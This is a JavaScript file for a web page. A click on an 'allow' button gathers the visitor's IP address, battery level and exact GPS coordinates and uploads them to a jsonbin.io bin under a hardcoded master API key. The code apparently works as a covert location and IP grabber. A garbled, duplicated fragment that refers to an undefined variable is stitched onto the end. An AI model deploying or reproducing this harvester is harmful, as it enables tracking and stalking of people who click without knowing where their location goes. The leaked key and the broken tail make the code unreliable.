const apiKey = "$2a$10$XLdRLN/H4dcQYzf2qwnGNuqObIHACk5WPIRyu6zTWwLm3sGZdT7hu";
const binId = "6477ac7160b339d231de081";
const statusEl = document.getElementById("status");
document.getElementById("allowBtn").addEventListener("click", async () => {
  let dataToSend = {
    timestamp: new Date().toISOString()
  };

  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    dataToSend.ip = ipData.ip;
  } catch (err) {
    dataToSend.ip = "Could not fetch";
  }

  try {
    const battery = await navigator.getBattery();
    dataToSend.battery = (battery.level * 100).toFixed(0) + "%";
  } catch (err) {
    dataToSend.battery = "Permission Denied / Not Supported";
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        dataToSend.location = {
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude
        };
        sendData(dataToSend);
      },
      (err) => {
        dataToSend.location = "Permission Denied";
        sendData(dataToSend);
      }
    );
  } else {
    dataToSend.location = "Not Supported";
    sendData(dataToSend);
  }
});

async function sendData(data) {
  statusEl.textContent = "Sending data...";
  try {
    await fetch("https://api.jsonbin.io/v3/b/" + binId, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        "X-Master-Key": apiKey
      },
      body: JSON.stringify(data)
    });
    statusEl.textContent = "✅ Data sent successfully!";
  } catch (error) {
    statusEl.textContent = "❌ Failed to send data.";
  }
}

data...";
  try {
    await fetch("https://api.jsonbin.io/v3/b/" + binId, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        "X-Master-Key": apiKey
      },
      body: JSON.stringify(dataStore)
    });
    statusEl.innerText = "✅ All data sent successfully!";
  } catch (error) {
    statusEl.innerText = "❌ Failed to send data.";
  }
}
